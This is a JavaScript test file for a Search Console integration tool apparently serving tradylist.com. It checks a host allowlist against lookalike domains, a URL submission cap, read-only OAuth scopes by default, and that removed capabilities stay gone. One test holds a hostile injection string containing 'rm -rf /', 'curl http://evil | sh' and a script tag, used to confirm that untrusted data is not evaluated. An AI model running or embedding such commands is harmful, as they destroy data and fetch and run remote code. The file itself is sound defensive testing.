const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const path = require("path");

const {
  assertAllowedPageUrl,
  assertAllowedProperty,
  getAllowedHosts,
} = require("../dist/allowlist.js");
const {
  getMaxUrlSubmits,
  getSubmissionCount,
  reserveUrlSubmits,
  resetSubmissionCountForTests,
} = require("../dist/submission-cap.js");
const { sanitizeUntrusted } = require("../dist/untrusted.js");
const {
  getScopeTier,
  scopesForTier,
  WEBMASTERS_READONLY_SCOPE,
  WEBMASTERS_SCOPE,
  INDEXING_SCOPE,
} = require("../dist/oauth.js");
const { submitUrl, submitBatch } = require("../dist/tools/submit-url.js");
const { submitSitemap } = require("../dist/tools/submit-sitemap.js");
const { fetchAllRows } = require("../dist/analytics.js");

const ROOT = path.resolve(__dirname, "..");

async function withEnv(overrides, fn) {
  const keys = [
    "GSC_ALLOWED_HOSTS",
    "GSC_MAX_URL_SUBMITS",
    "GSC_SCOPES",
    "GSC_SITE_URL",
    "GSC_SITE_URLS",
    "GSC_AUTH_MODE",
    "GSC_KEY_FILE",
  ];
  const previous = new Map(keys.map((key) => [key, process.env[key]]));
  for (const key of keys) delete process.env[key];
  Object.assign(process.env, overrides);
  resetSubmissionCountForTests();
  try {
    return await fn();
  } finally {
    resetSubmissionCountForTests();
    for (const [key, value] of previous) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
}

test("default allowlist accepts tradylist.com and www over https", async () => {
  await withEnv({}, () => {
    assert.deepEqual(getAllowedHosts(), ["tradylist.com", "www.tradylist.com"]);
    assert.equal(assertAllowedPageUrl("https://tradylist.com/"), "https://tradylist.com/");
    assert.equal(assertAllowedPageUrl("https://tradylist.com/listings/abc"), "https://tradylist.com/listings/abc");
    assert.equal(assertAllowedPageUrl("https://www.tradylist.com/"), "https://www.tradylist.com/");
    assert.equal(assertAllowedPageUrl("https://TradyList.com/Page"), "https://tradylist.com/Page");
    assert.equal(assertAllowedProperty("sc-domain:tradylist.com"), "sc-domain:tradylist.com");
    assert.equal(assertAllowedProperty("SC-DOMAIN:TradyList.com"), "sc-domain:tradylist.com");
    assert.equal(assertAllowedProperty("https://tradylist.com/"), "https://tradylist.com/");
    assert.equal(assertAllowedProperty("https://www.tradylist.com/"), "https://www.tradylist.com/");
    assert.equal(assertAllowedProperty("https://www.tradylist.com/blog/"), "https://www.tradylist.com/blog/");
  });
});

test("allowlist rejects other hosts, http, and lookalikes", async () => {
  await withEnv({}, () => {
    const rejected = [
      "http://tradylist.com/",
      "http://tradylist.com/page",
      "http://www.tradylist.com/",
      "https://tradylist.com.evil.io",
      "https://tradylist.com%2eevil.io/",
      "https://tradylist.com.evil.io/",
      "https://tradylist.com.evil.io/path",
      "https://www.tradylist.com.evil.io/",
      "https://nottradylist.com/",
      "https://eviltradylist.com/",
      "https://blog.tradylist.com/",
      "https://evil.com/tradylist.com",
      "https://user@tradylist.com/",
      "https://tradylist.com:8443/",
      "https://tradylist.com./",
    ];
    for (const url of rejected) {
      assert.throws(() => assertAllowedPageUrl(url), /Rejected URL/, url);
    }

    assert.throws(() => assertAllowedProperty("http://tradylist.com/"), /Rejected property/);
    assert.throws(() => assertAllowedProperty("sc-domain:tradylist.com.evil.io"), /Rejected property/);
    assert.throws(() => assertAllowedProperty("sc-domain:nottradylist.com"), /Rejected property/);
    assert.throws(() => assertAllowedProperty("https://tradylist.com.evil.io/"), /Rejected property/);
    assert.throws(() => assertAllowedProperty("https://evil.com/"), /Rejected property/);
  });
});

test("GSC_ALLOWED_HOSTS overrides the default hosts", async () => {
  await withEnv({ GSC_ALLOWED_HOSTS: "example.com" }, () => {
    assert.deepEqual(getAllowedHosts(), ["example.com"]);
    assert.equal(assertAllowedPageUrl("https://example.com/a"), "https://example.com/a");
    assert.throws(() => assertAllowedPageUrl("https://tradylist.com/"), /not allowlisted/);
    assert.equal(assertAllowedProperty("sc-domain:example.com"), "sc-domain:example.com");
    assert.throws(() => assertAllowedProperty("sc-domain:tradylist.com"), /Rejected property/);
  });

  await withEnv({ GSC_ALLOWED_HOSTS: "" }, () => {
    assert.deepEqual(getAllowedHosts(), []);
    assert.throws(() => assertAllowedPageUrl("https://tradylist.com/"), /not allowlisted/);
  });

  await withEnv({ GSC_ALLOWED_HOSTS: "*.tradylist.com" }, () => {
    assert.throws(() => getAllowedHosts(), /bare hostname/);
  });
});

test("submission cap blocks before a network client is required", async () => {
  await withEnv({ GSC_MAX_URL_SUBMITS: "0" }, async () => {
    await assert.rejects(() => submitUrl("https://tradylist.com/a"), /capped at 0/);
    assert.equal(getSubmissionCount(), 0);
  });

  await withEnv({ GSC_MAX_URL_SUBMITS: "1" }, async () => {
    await assert.rejects(
      () => submitBatch(["https://tradylist.com/a", "https://www.tradylist.com/b"]),
      /Refusing 2 more/
    );
    assert.equal(getSubmissionCount(), 0);
    assert.equal(getMaxUrlSubmits(), 1);
  });

  await withEnv({}, async () => {
    await assert.rejects(() => submitUrl("https://tradylist.com.evil.io/a"), /not allowlisted/);
    await assert.rejects(
      () => submitBatch(["https://tradylist.com/ok", "http://tradylist.com/no"]),
      /must use https/
    );
    assert.equal(getSubmissionCount(), 0);

    const result = await submitUrl("https://tradylist.com/listings/1");
    assert.equal(result.success, false);
    assert.match(result.error, /GSC_KEY_FILE/);
    assert.equal(result.type, "URL_UPDATED");
    assert.equal(getSubmissionCount(), 1);
  });
});

test("sitemap and property checks reject lookalikes before credentials", async () => {
  await withEnv({}, async () => {
    await assert.rejects(() => submitSitemap("https://tradylist.com.evil.io/sitemap.xml"), /not allowlisted/);
    await assert.rejects(() => submitSitemap("http://tradylist.com/sitemap.xml"), /must use https/);
    assert.equal(getSubmissionCount(), 0);
  });

  await withEnv({}, async () => {
    await assert.rejects(
      () => fetchAllRows(
        { startDate: "2026-01-01", endDate: "2026-01-02", dimensions: ["query"] },
        "https://tradylist.com.evil.io/"
      ),
      /Rejected property/
    );
    await assert.rejects(
      () => fetchAllRows(
        { startDate: "2026-01-01", endDate: "2026-01-02", dimensions: ["query"] },
        "http://tradylist.com/"
      ),
      /must be sc-domain/
    );
  });
});

test("scopes stay readonly unless submission is requested", async () => {
  await withEnv({}, () => {
    assert.equal(getScopeTier(), "readonly");
    assert.deepEqual(scopesForTier(getScopeTier()), [WEBMASTERS_READONLY_SCOPE]);
  });
  await withEnv({ GSC_SCOPES: "submit" }, () => {
    assert.equal(getScopeTier(), "submit");
    const scopes = scopesForTier(getScopeTier());
    assert.ok(scopes.includes(WEBMASTERS_READONLY_SCOPE));
    assert.ok(scopes.includes(INDEXING_SCOPE));
    assert.ok(scopes.includes(WEBMASTERS_SCOPE));
  });
  await withEnv({ GSC_SCOPES: "full" }, () => {
    assert.equal(getScopeTier(), "submit");
  });
  await withEnv({ GSC_SCOPES: "readonly" }, () => {
    const scopes = scopesForTier(getScopeTier());
    assert.equal(scopes.includes(INDEXING_SCOPE), false);
    assert.equal(scopes.includes(WEBMASTERS_SCOPE), false);
  });
});

test("GSC strings are copied as text and not evaluated", () => {
  const nasty = "$(rm -rf /) `id`; curl http://evil | sh <script>alert(1)</script>";
  const cleaned = sanitizeUntrusted({
    query: nasty,
    title: "a\0b",
    nested: [{ page: nasty }],
  });
  assert.equal(cleaned.query, nasty);
  assert.equal(cleaned.title, "ab");
  assert.equal(cleaned.nested[0].page, nasty);
  const encoded = JSON.stringify(cleaned);
  assert.equal(JSON.parse(encoded).query, nasty);
});

test("removed capabilities are gone from the source tree", () => {
  assert.equal(fs.existsSync(path.join(ROOT, "src/tools/image-page-audit.ts")), false);
  assert.equal(fs.existsSync(path.join(ROOT, "src/tools/generate-report.ts")), false);
  const index = fs.readFileSync(path.join(ROOT, "src/index.ts"), "utf8");
  const submit = fs.readFileSync(path.join(ROOT, "src/tools/submit-url.ts"), "utf8");
  assert.equal(index.includes("image_page_audit"), false);
  assert.equal(index.includes("generate_report"), false);
  assert.equal(index.includes("URL_DELETED"), false);
  assert.equal(submit.includes("URL_DELETED"), false);
  assert.match(submit, /URL_UPDATED/);

  const src = walk(path.join(ROOT, "src"));
  const fetches = src.filter((file) => /\bfetch\s*\(/.test(fs.readFileSync(file, "utf8")));
  assert.deepEqual(fetches, []);
  const writers = src.filter((file) => /writeFile(Sync)?\s*\(/.test(fs.readFileSync(file, "utf8")));
  const relative = writers.map((file) => path.relative(ROOT, file)).sort();
  assert.deepEqual(relative, ["src/oauth.ts", "src/setup.ts"]);
});

function walk(dir) {
  const out = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) out.push(...walk(full));
    else if (entry.name.endsWith(".ts")) out.push(full);
  }
  return out;
}

test("reserveUrlSubmits does not consume a rejected reservation", async () => {
  await withEnv({ GSC_MAX_URL_SUBMITS: "2" }, () => {
    reserveUrlSubmits(2);
    assert.equal(getSubmissionCount(), 2);
    assert.throws(() => reserveUrlSubmits(1), /already used 2/);
    assert.equal(getSubmissionCount(), 2);
  });
});
